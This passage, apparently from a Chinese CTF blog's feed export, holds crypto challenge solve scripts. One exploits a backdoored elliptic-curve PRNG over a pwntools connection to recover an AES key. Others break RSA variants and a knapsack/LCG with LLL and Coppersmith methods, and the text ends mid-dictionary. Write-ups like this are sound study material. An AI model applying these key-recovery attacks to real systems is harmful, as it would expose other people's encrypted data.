<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from sys import stdout</span><br><span class="line">from fastecdsa.curve import P256</span><br><span class="line">from fastecdsa.point import Point</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from tqdm import trange</span><br><span class="line"></span><br><span class="line">VERBOSE = True</span><br><span class="line"></span><br><span class="line">G = P256.G</span><br><span class="line"></span><br><span class="line">def pad(s):</span><br><span class="line">    return s + (16 - len(s) % 16) * b&quot;\x00&quot;</span><br><span class="line"></span><br><span class="line">class PRNG:</span><br><span class="line">    def __init__(self, e, seed):</span><br><span class="line">        self.state = seed</span><br><span class="line">        self.Q = e * G</span><br><span class="line">        self.P = G</span><br><span class="line">        self.mask = 2**240 - 1</span><br><span class="line">        </span><br><span class="line">    def gen(self):</span><br><span class="line">        new_point = self.state * self.P</span><br><span class="line">        r = new_point.x</span><br><span class="line">        self.state = r</span><br><span class="line">        ret = r * self.Q</span><br><span class="line">        return ret.x &amp; self.mask</span><br><span class="line"></span><br><span class="line">def p256_mod_sqrt(c):</span><br><span class="line">    p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff</span><br><span class="line">    t1 = pow(c, 2, p)</span><br><span class="line">    t1 = (t1 * c) % p</span><br><span class="line">    t2 = pow(t1, 2**2, p)</span><br><span class="line">    t2 = (t2 * t1) % p</span><br><span class="line">    t3 = pow(t2, 2**4, p)</span><br><span class="line">    t3 = (t3 * t2) % p</span><br><span class="line">    t4 = pow(t3, 2**8, p)</span><br><span class="line">    t4 = (t4 * t3) % p</span><br><span class="line">    r = pow(t4, 2**16, p)</span><br><span class="line">    r = (r * t4) % p</span><br><span class="line">    r = pow(r, 2**32, p)</span><br><span class="line">    r = (r * c) % p</span><br><span class="line">    r = pow(r, 2**96, p)</span><br><span class="line">    r = (r * c) % p</span><br><span class="line">    return pow(r, 2**94, p)</span><br><span class="line"></span><br><span class="line">def find_point_on_p256(x):</span><br><span class="line">    # equation: y^2 = x^3-ax+b</span><br><span class="line">    y2 = (x * x * x) - (3 * x) + P256.b</span><br><span class="line">    y2 = y2 % P256.p</span><br><span class="line">    y = p256_mod_sqrt(y2)</span><br><span class="line">    return y2 == (y * y) % P256.p, y</span><br><span class="line"></span><br><span class="line">class Solve:</span><br><span class="line">    def __init__(self) -&gt; None:</span><br><span class="line">        self.conn = remote(&#x27;192.168.0.64&#x27;, 58010)</span><br><span class="line">        self.n = 15</span><br><span class="line">    </span><br><span class="line">    def s_3(self):</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;3&#x27;)</span><br><span class="line">        </span><br><span class="line">        x0 = eval(self.conn.recvline())</span><br><span class="line">        x = eval(self.conn.recvline())</span><br><span class="line">        y = eval(self.conn.recvline())</span><br><span class="line">        x1 = x[:self.n]</span><br><span class="line">        x2 = x[self.n:]</span><br><span class="line">        p_list = []</span><br><span class="line">        PR = PolynomialRing(Zmod(x0), &#x27;x&#x27;)</span><br><span class="line">        x_ = PR.gen()</span><br><span class="line">        f = x_ + y</span><br><span class="line">        sol = f.small_roots(X=2**20, beta=1./20)</span><br><span class="line">        p_list = [ZZ(gcd(t + y, x0)) for t in sol]</span><br><span class="line">        print(len(p_list))</span><br><span class="line">        e = min(p_list)</span><br><span class="line">        # print(set(p0) == set(p_list))</span><br><span class="line">        return e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def gen_prediction(self, observed, Q, d):</span><br><span class="line">        ret = []</span><br><span class="line">        for high_bits in trange(2**15): # 2**16: have sol, 2**15: 1/2 prob</span><br><span class="line">            guess = (high_bits &lt;&lt; (8 * 30)) | observed</span><br><span class="line">            on_curve, y = find_point_on_p256(guess)</span><br><span class="line"></span><br><span class="line">            if on_curve:</span><br><span class="line">                # use the backdoor to guess the next 30 bytes</span><br><span class="line">                point = Point(guess, y, curve=P256)</span><br><span class="line">                s = (d * point).x</span><br><span class="line">                r = (s * Q).x &amp; (2**(8 * 30) - 1)</span><br><span class="line">                ret.append(r)</span><br><span class="line"></span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    def s_pred(self, e):</span><br><span class="line">        d = int(inverse(e, P256.q))</span><br><span class="line">        Q = e * G</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;1&#x27;)</span><br><span class="line">        observed = eval(self.conn.recvline())</span><br><span class="line">        # print(guess)</span><br><span class="line">        # pred = eval(self.conn.recvline())</span><br><span class="line">        # print(pred)</span><br><span class="line">        predicted = self.gen_prediction(observed, Q, d)</span><br><span class="line">        # print(len(predicted))</span><br><span class="line">        # print(pred in predicted)</span><br><span class="line">        </span><br><span class="line">        return predicted</span><br><span class="line">    </span><br><span class="line">    def s_2(self, pred):</span><br><span class="line">        self.conn.sendlineafter(&#x27;&gt;&#x27;, &#x27;2&#x27;)</span><br><span class="line">        self.conn.recvuntil(&#x27;ct: &#x27;)</span><br><span class="line">        ct = self.conn.recvline().strip()</span><br><span class="line">        ct = base64.b64decode(ct)</span><br><span class="line">        for nx in pred:</span><br><span class="line">            key = pad(long_to_bytes(nx))</span><br><span class="line">            cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">            pt = cipher.decrypt(ct)</span><br><span class="line">            if (all(64 &lt; x &lt; 128 for x in pt)):</span><br><span class="line">                print(pt)</span><br><span class="line">                self.conn.sendlineafter(&#x27;pt:&#x27;, base64.b64encode(pt))</span><br><span class="line">                self.conn.interactive()</span><br><span class="line">                return True</span><br><span class="line">        else:</span><br><span class="line">            self.conn.close()</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def s(self):</span><br><span class="line">        e = int(self.s_3())</span><br><span class="line">        pred = self.s_pred(e)</span><br><span class="line">        if (pred == 0):</span><br><span class="line">            self.conn.close()</span><br><span class="line">            return False</span><br><span class="line">        is_success = self.s_2(pred)</span><br><span class="line">        return is_success</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    while True:</span><br><span class="line">        print(&#x27;Begin try...&#x27;)</span><br><span class="line">        s = Solve()</span><br><span class="line">        is_success = s.s()</span><br><span class="line">        if (is_success):</span><br><span class="line">            break</span><br><span class="line">        print(&#x27;Failed&#x27;)</span><br></pre></td></tr></table></figure>
<p>因为环境问题最后在队友电脑上出的--</p>
<h1 id="rsa">RSA</h1>
<p>送分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">lcm = <span class="number">4292158730589770192682795435047249488185453170529228019750042608688907718268448193363838203887391025871515871000364259326343790645215256385842265899206372365402431198699714374850409466996627163968391249416054093529090485677808301343590811445080871279796162536469847469761747058736980603093722710824453312207182881241846080117790728778291633761198069016865260030288832065807438020772711645648333908622890343009942617559434851450007195025869850769670769715654662127278293639938359741401336592219730356884542179574372134014927006215640945952229142436595334916765255426954857520777553915330597952622785359222832224632624</span></span><br><span class="line">c = <span class="number">4288727484183191191687364666620023549392656794153112764357730676861570386983002380982803054964588111708662498647767438881892355599604826306427809017097724346976778230464708540600157055782723189971534549543664668430013171469625043063261219462210251726207552819381767396148632877168530609902046293626355744288863460554297860696918890189350721960355460410677203131993419723440382095665713164422367291153108363066159712951217816814873413423853338021627653555202253351957999686659021298525147460016557904084617528199284448056532965033560516083489693334373695545423561715471204868795248569806148395196572046378679014697206</span></span><br><span class="line">N  = <span class="number">17168634922359080770731181740188997952741812682116912079000170434755630873073792773455352815549564103486063484001457037305375162580861025543369063596825489461609724794798857499401637867986508655873564997664216374116361942711233205374363245780323485119184650145879389879046988234947922412374890843297813248828996855478005656041814919367820336728271583686844991928889831691815821365423570311291064846736832327637944358854661523107817781673029406341843040857813841671405147146887291204140157388049394514390098066284975682117038362207142272098796924412602725857521665773622056312191400612944442008222587867782281556388669</span></span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(E, lcm)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5(long_to_bytes(<span class="built_in">pow</span>(c,d,N))).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ECC</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>祥云杯</title>
    <url>/2022/10/30/2022/%E7%A5%A5%E4%BA%91%E6%9D%AF/</url>
    <content><![CDATA[<p>第二次参加了，时间好快呀</p>
<span id="more"></span>
<h3 id="tracing">tracing</h3>
<p>大概的逻辑就是从日志逆推出phi</p>
<p>从最后这里return a可以看出s一直是0</p>
<p><img src="../images/%E7%A5%A5%E4%BA%91%E6%9D%AF/asynccode" alt="img"></p>
<p>，所以只有三种情况，分别判定然后逆就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">if_exc</span>(<span class="params">ct</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a, b = b, a&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isOdd</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> a &amp; <span class="number">1</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;trace.out&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">l = <span class="built_in">len</span>(a)</span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line">e = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;task.py(6):     while b != 0:&#x27;</span> == a[i]:</span><br><span class="line">        idx = i</span><br><span class="line">        ct = a[idx: idx+<span class="number">13</span>]</span><br><span class="line">        <span class="keyword">if</span> if_exc(ct):</span><br><span class="line">            phi, e = e, phi</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;task.py(9):                 a = a - b&#x27;</span> <span class="keyword">in</span> ct <span class="keyword">and</span> <span class="string">&quot;task.py(10):                 a = rshift1(a)&quot;</span> <span class="keyword">in</span> ct:</span><br><span class="line">            phi = <span class="number">2</span> * phi + e</span><br><span class="line">            <span class="keyword">if</span> isOdd(phi):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                phi = phi + <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;task.py(14):                 b = rshift1(b)&quot;</span> <span class="keyword">in</span> ct:</span><br><span class="line">            e *= <span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;task.py(19):                 a = rshift1(a)&quot;</span> <span class="keyword">in</span> ct:</span><br><span class="line">            phi *= <span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">64885875317556090558238994066256805052213864161514435285748891561779867972960805879348109302233463726130814478875296026610171472811894585459078460333131491392347346367422276701128380739598873156279173639691126814411752657279838804780550186863637510445720206103962994087507407296814662270605713097055799853102</span></span><br><span class="line">n = <span class="number">113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813765700336353715590069074081309886710425934960057225969468061891326946398492194812594219890553185043390915509200930203655022420444027841986189782168065174301</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="built_in">print</span>(phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>
<h3 id="fill">fill</h3>
<p>背包+lcg套娃</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">S = <span class="number">492226042629702</span></span><br><span class="line">nbits = <span class="number">32</span></span><br><span class="line">n = <span class="number">991125622</span></span><br><span class="line">s0, s1, s2 = <span class="number">562734112</span>, <span class="number">859151551</span>, <span class="number">741682801</span></span><br><span class="line">m = (s2 - s1) * inverse(s1 - s0, n) % n </span><br><span class="line">c = (s2 - m * s1) % n</span><br><span class="line">s = [<span class="number">0</span>] * nbits</span><br><span class="line">s[<span class="number">0</span>] = s0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, nbits):</span><br><span class="line">    s[i] = (s[i-<span class="number">1</span>]*m+c)%n</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">M = [<span class="number">19621141192340</span>, <span class="number">39617541681643</span>, <span class="number">3004946591889</span>, <span class="number">6231471734951</span>, <span class="number">3703341368174</span>, <span class="number">48859912097514</span>, <span class="number">4386411556216</span>, <span class="number">11028070476391</span>, <span class="number">18637548953150</span>, <span class="number">29985057892414</span>, <span class="number">20689980879644</span>, <span class="number">20060557946852</span>, <span class="number">46908191806199</span>, <span class="number">8849137870273</span>, <span class="number">28637782510640</span>, <span class="number">35930273563752</span>, <span class="number">20695924342882</span>, <span class="number">36660291028583</span>, <span class="number">10923264012354</span>, <span class="number">29810154308143</span>, <span class="number">4444597606142</span>, <span class="number">31802472725414</span>, <span class="number">23368528779283</span>, <span class="number">15179021971456</span>, <span class="number">34642073901253</span>, <span class="number">44824809996134</span>, <span class="number">31243873675161</span>, <span class="number">27159321498211</span>, <span class="number">2220647072602</span>, <span class="number">20255746235462</span>, <span class="number">24667528459211</span>, <span class="number">46916059974372</span>]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    M[t] = M[t] - s[t]</span><br><span class="line">A = Matrix(ZZ,nbits+<span class="number">1</span>,nbits+<span class="number">1</span>)</span><br><span class="line"><span class="comment"># fill in the identity matrix</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    A[i,i] = <span class="number">1</span></span><br><span class="line"><span class="comment"># replace the bottom row with your public key</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    A[i,nbits] = M[i]</span><br><span class="line"><span class="comment"># last element is the encoded message</span></span><br><span class="line">A[nbits,nbits] = -<span class="built_in">int</span>(S)</span><br><span class="line">res = A.LLL()</span><br><span class="line"><span class="built_in">print</span>(res[-<span class="number">1</span>][:-<span class="number">1</span>]) <span class="comment">#need to remove last element 0</span></span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    msg += <span class="built_in">str</span>(res[-<span class="number">1</span>][:-<span class="number">1</span>][i])</span><br><span class="line">msg = <span class="built_in">int</span>(msg, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + sha256(<span class="built_in">str</span>(msg).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="little-little-fermat">little little fermat</h3>
<p>高位相同，开根取高位，然后copper就分解，求阶那里直接用order</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, isPrime</span><br><span class="line">n = <span class="number">141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393</span></span><br><span class="line">c = <span class="number">81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883</span></span><br><span class="line"></span><br><span class="line">p_high = <span class="number">1722441419253596810002937511265334240319736590159222908199095871448693784787182036443</span></span><br><span class="line">PR.&lt;z&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = z + p_high*<span class="number">2</span>^(<span class="number">512</span>-<span class="number">280</span>)</span><br><span class="line">z0 = f.small_roots(X=<span class="number">2</span>^(<span class="number">512</span>-<span class="number">280</span>), beta=<span class="number">0.4</span>)</span><br><span class="line">p_q = []</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> z0:</span><br><span class="line">    p = <span class="built_in">int</span>(z + p_high*<span class="number">2</span>^(<span class="number">512</span>-<span class="number">280</span>))</span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        p_q.append(p)</span><br><span class="line">p = <span class="built_in">max</span>(p_q)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">G=GF(p)</span><br><span class="line">x = G(<span class="number">114514</span>).order() - <span class="number">1</span></span><br><span class="line">x = x^<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(long_to_byets(m^^x))</span><br></pre></td></tr></table></figure>
<h3 id="leak_rsa">leak_rsa</h3>
<p>总的逻辑是先用d的高位去爆破32位的k，再用k去爆破pqd，第一步的代码直接抄github上的https://github.com/jvdsn/crypto-attacks/blob/5c7989ceac599f1f8e016b5afb0d2966759cd470/test/test_factorization.py#L46，但是因为是32bit要用多进程才跑的出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_params_prob</span>():</span><br><span class="line">    n = <span class="number">73380160475470842653695210816683702314062827937540324056880543809752271506601290265975543542548117392788987830919581511428492717214125296973338501980504384307279414528799452106399062576988406269897425829853390463840834798274139351938197666753546672052277640048588091137812362810008344723302886421059831149393</span></span><br><span class="line">    e = <span class="number">3116872133</span></span><br><span class="line">    c = <span class="number">69574121902821459446683688068339366486115223765903849266663001038736496551168104587683366853482649748413400537793260948337629422998336301256862519087984048032673577462034223842650399943613576577927825123830629917138007035313624847266208032195071033675853881447717750353382112841885318776240405314057286867952</span></span><br><span class="line">    hint1 = &#123;<span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">401</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">420</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">192</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">497</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">110</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">206</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">326</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">320</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">222</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">166</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">496</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">181</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">288</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">69</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">127</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">308</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">235</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">94</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">309</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">487</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">234</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">98</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">101</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">387</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">162</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">485</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">413</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">242</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">456</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">264</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">407</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">135</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">84</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">476</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">176</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">230</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">432</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">79</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">290</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">507</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">421</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">334</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">85</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">511</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">491</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">370</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">92</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">495</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">279</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">346</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">87</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">243</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span 